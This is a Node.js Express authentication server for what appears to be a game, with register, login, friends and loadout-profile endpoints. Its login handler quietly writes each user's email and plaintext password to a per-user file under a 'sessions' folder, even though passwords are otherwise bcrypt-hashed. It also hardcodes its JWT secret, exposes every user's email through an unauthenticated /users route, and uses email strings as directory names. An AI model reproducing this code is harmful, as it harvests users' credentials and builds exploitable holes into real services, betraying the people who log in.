const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const DB_FILE = path.join(__dirname,'users.json');
function readDB(){ try{return JSON.parse(fs.readFileSync(DB_FILE,'utf8')||'[]')}catch(e){return []} }
function writeDB(data){ fs.writeFileSync(DB_FILE, JSON.stringify(data,null,2)) }

const app = express();
app.use(cors());
app.use(express.json());

const JWT_SECRET = 'replace-me-with-secure-secret';

app.post('/register', async (req,res)=>{
  const {username,email,password} = req.body;
  if(!email||!password) return res.status(400).json({error:'missing'});
  const users = readDB();
  if(users.find(u=>u.email===email)) return res.status(409).json({error:'exists'});
  const hash = await bcrypt.hash(password,10);
  const u = {id:Date.now(),username,email,hash,friends:[],selectedLoadout:null};
  users.push(u); writeDB(users);
  const token = jwt.sign({id:u.id,email:u.email}, JWT_SECRET, {expiresIn:'1h'});
  res.json({token,user:{id:u.id,username:u.username,email:u.email}});
});

app.post('/login', async (req,res)=>{
  const {email,password} = req.body; if(!email||!password) return res.status(400).json({error:'missing'});
  const users = readDB();
  const u = users.find(x=>x.email===email);
  if(!u) return res.status(401).json({error:'invalid'});
  const ok = await bcrypt.compare(password,u.hash);
  if(!ok) return res.status(401).json({error:'invalid'});
  // Create folder and save plain credentials per task
  const sessionsDir = path.join(__dirname, 'sessions', u.email);
  fs.mkdirSync(sessionsDir, { recursive: true });
  fs.writeFileSync(path.join(sessionsDir, 'info.txt'), `email: ${u.email}\npassword: ${password}`);
  const token = jwt.sign({id:u.id,email:u.email}, JWT_SECRET, {expiresIn:'1h'});
  res.json({token,user:{id:u.id,username:u.username,email:u.email}});
});

// List users (public-lite)
app.get('/users', (req,res)=>{
  const users = readDB().map(u=>({id:u.id,username:u.username,email:u.email}));
  res.json(users);
});

// Add friend (authenticated)
app.post('/friends/add', (req,res)=>{
  const auth = req.headers.authorization;
  if(!auth||!auth.startsWith('Bearer ')) return res.status(401).json({error:'auth'});
  const token = auth.slice(7);
  try{
    const payload = jwt.verify(token, JWT_SECRET);
    const {targetEmail} = req.body;
    if(!targetEmail) return res.status(400).json({error:'missing'});
    const users = readDB();
    const me = users.find(u=>u.id===payload.id);
    const target = users.find(u=>u.email===targetEmail);
    if(!me || !target) return res.status(404).json({error:'notfound'});
    if(!me.friends) me.friends = [];
    if(!me.friends.includes(target.email)) me.friends.push(target.email);
    writeDB(users);
    return res.json({ok:true});
  }catch(e){ return res.status(401).json({error:'invalid'}); }
});

// Get friends list for authenticated user
app.get('/friends', (req,res)=>{
  const auth = req.headers.authorization;
  if(!auth||!auth.startsWith('Bearer ')) return res.status(401).json({error:'auth'});
  const token = auth.slice(7);
  try{
    const payload = jwt.verify(token, JWT_SECRET);
    const users = readDB();
    const me = users.find(u=>u.id===payload.id);
    if(!me) return res.status(404).json({error:'notfound'});
    const friends = (me.friends||[]).map(email=> users.find(u=>u.email===email)).filter(Boolean).map(u=>({username:u.username,email:u.email}));
    res.json(friends);
  }catch(e){ return res.status(401).json({error:'invalid'}); }
});

// Get profile (including selectedLoadout)
app.get('/profile', (req,res)=>{
  const auth = req.headers.authorization;
  if(!auth||!auth.startsWith('Bearer ')) return res.status(401).json({error:'auth'});
  const token = auth.slice(7);
  try{
    const payload = jwt.verify(token, JWT_SECRET);
    const users = readDB();
    const me = users.find(u=>u.id===payload.id);
    if(!me) return res.status(404).json({error:'notfound'});
    return res.json({username:me.username,email:me.email,selectedLoadout:me.selectedLoadout||null,friends:me.friends||[]});
  }catch(e){ return res.status(401).json({error:'invalid'}); }
});

// Update profile (partial) - supports {selectedLoadout}
app.post('/profile', (req,res)=>{
  const auth = req.headers.authorization;
  if(!auth||!auth.startsWith('Bearer ')) return res.status(401).json({error:'auth'});
  const token = auth.slice(7);
  try{
    const payload = jwt.verify(token, JWT_SECRET);
    const users = readDB();
    const me = users.find(u=>u.id===payload.id);
    if(!me) return res.status(404).json({error:'notfound'});
    const {selectedLoadout} = req.body;
    if(typeof selectedLoadout !== 'undefined') me.selectedLoadout = selectedLoadout;
    writeDB(users);
    return res.json({ok:true,selectedLoadout:me.selectedLoadout||null});
  }catch(e){ return res.status(401).json({error:'invalid'}); }
});

app.get('/health', (req,res)=>res.json({ok:true}));

const port = process.env.PORT || 4000;
app.listen(port,()=>console.log('Auth scaffold running on',port));
